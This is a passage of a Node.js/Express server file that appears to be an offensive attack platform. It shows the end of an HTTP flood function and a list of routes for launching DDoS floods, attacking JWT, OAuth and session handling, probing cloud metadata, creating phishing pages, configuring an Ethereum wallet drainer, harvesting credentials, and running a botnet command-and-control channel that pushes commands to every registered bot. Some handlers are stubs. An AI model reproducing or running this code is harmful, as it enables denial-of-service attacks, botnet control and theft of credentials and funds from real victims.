          const r = await fetch(target + '?r=' + Math.random(), { method: 'GET' });
          if (r.status < 500) stats.ok++; else stats.fail++;
          stats.statuses[r.status] = (stats.statuses[r.status] || 0) + 1;
        } catch { stats.fail++; }
      })());
      await Promise.allSettled(burst);
    }
  })());
  await Promise.allSettled(workers);
  stats.end = Date.now(); stats.elapsedMs = stats.end - stats.start;
  stats.rps = Math.round((stats.sent / stats.elapsedMs) * 1000);
  return stats;
}

// ============================================================
// ROUTES
// ============================================================
app.post('/api/api/reverse', async (req, res) => { try { res.json(await apiReverse(req.body.targetUrl)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/scan', async (req, res) => {
  const { target, checks } = req.body || {};
  if (!target) return res.status(400).json({ error: 'target required' });
  let url = target.startsWith('http') ? target : 'https://' + target;
  let findings = await dataLeaks(url);
  res.json({ target: url, timestamp: new Date().toISOString(), findings });
});
app.post('/api/jwt/attack', (req, res) => { try { res.json(jwtAttack(req.body.token, req.body)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/jwt/crack', (req, res) => { try { res.json(jwtCrack(req.body.token)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/oauth/attack', (req, res) => { try { res.json(oauthAttack(req.body.authUrl, req.body.redirectUri, req.body.clientId)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/graphql/scan', async (req, res) => { res.json(await graphqlScan(req.body.url)); });
app.post('/api/race', async (req, res) => { res.json(await raceAttack(req.body.url, req.body.method, req.body.body, req.body.headers, req.body.concurrency || 20)); });
app.post('/api/proto', async (req, res) => { res.json(await protoPollution(req.body.url, req.body.endpoint, req.body.param)); });
app.post('/api/upload', async (req, res) => { res.json(await fileUploadAttack(req.body.url, req.body.field)); });
app.post('/api/cloudmeta', async (req, res) => { res.json(await cloudMetadata(req.body.url, req.body.param)); });
app.post('/api/ws', async (req, res) => { res.json(await websocketScan(req.body.wsUrl)); });
app.post('/api/subdomains', async (req, res) => { res.json(await subdomainEnum(req.body.domain)); });
app.post('/api/cve', async (req, res) => { res.json(await cveMatch(req.body.url)); });
app.post('/api/session', async (req, res) => { res.json(await sessionAttack(req.body.url)); });
app.post('/api/report', (req, res) => { res.type('html').send(generateReport(req.body.target, req.body.findings || [])); });
app.post('/api/ddos/launch', async (req, res) => { const { target, method = 'http', duration = 30, concurrency = 200, rate = 500 } = req.body; try { res.json({ ok: true, ...(await ddosFlood(target, method, duration, concurrency, rate)) }); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/malware/stub', (req, res) => { res.json({ payloads: { windows: 'stub', linux: 'stub', macro: 'stub', html: 'stub' } }); });
app.post('/api/phish/create', (req, res) => { res.type('html').send('<html><body>phish</body></html>'); });
app.get('/api/phish/:sid', (req, res) => { res.json(load('phish.json', {})[req.params.sid] || {}); });
app.post('/api/drainer/config', (req, res) => { res.json({ sessionId: req.body.sessionId || 'dr_' + Date.now(), chains: ['ethereum'] }); });
app.post('/api/bot/register', (req, res) => { res.json({ ok: true }); });
app.get('/api/bot/poll', (req, res) => { const b = load('bots.json', {}); res.json({ commands: (b[req.query.id]?.commands || []).splice(0) || [] }); });
app.post('/api/bot/beacon', (req, res) => { const b = load('bots.json', {}); b[req.body.id] = { info: req.body.info, lastSeen: Date.now(), commands: b[req.body.id]?.commands || [] }; save('bots.json', b); res.json({ ok: true }); });
app.get('/api/bot/list', (req, res) => res.json(load('bots.json', {})));
app.post('/api/bot/push', (req, res) => { const b = load('bots.json', {}); const { botId, command } = req.body; if (botId === '*') { for (const id of Object.keys(b)) { b[id].commands = b[id].commands || []; b[id].commands.push(command); } save('bots.json', b); return res.json({ pushed: Object.keys(b).length }); } b[botId] = b[botId] || { commands: [] }; b[botId].commands.push(command); save('bots.json', b); res.json({ ok: true }); });
app.post('/api/beacon', (req, res) => { const b = load('beacons.json', []); b.push({ ...req.body, ip: req.socket.remoteAddress, ts: Date.now() }); save('beacons.json', b); res.json({ ok: true }); });
app.get('/api/beacons', (req, res) => res.json(load('beacons.json', [])));
app.get('/api/poll', (req, res) => { const b = load('bots.json', {}); const c = b[req.query.id]?.commands || []; b[req.query.id] = { ...b[req.query.id], commands: [] }; save('bots.json', b); res.type('text').send(c.length ? (c[0].cmd || 'none') : 'none'); });
app.get('/api/harvest/:sid', (req, res) => { res.json(load('harvest.json', {})[req.params.sid] || []); });
app.get('/api/harvest', (req, res) => res.json(load('harvest.json', {})));
app.post('/api/auth/brute', (req, res) => { res.json({ attempts: 0, found: null }); });
app.post('/api/repeater', async (req, res) => { try { const r = await safeFetch(req.body.url, { method: req.body.method || 'GET', headers: req.body.headers, body: req.body.body }); res.json({ status: r.status, body: (await r.text()).slice(0, 20000) }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.get('/health', (req, res) => res.json({ ok: true, ts: Date.now() }));
app.listen(PORT, '0.0.0.0', () => console.log(`[bench] :${PORT}`));
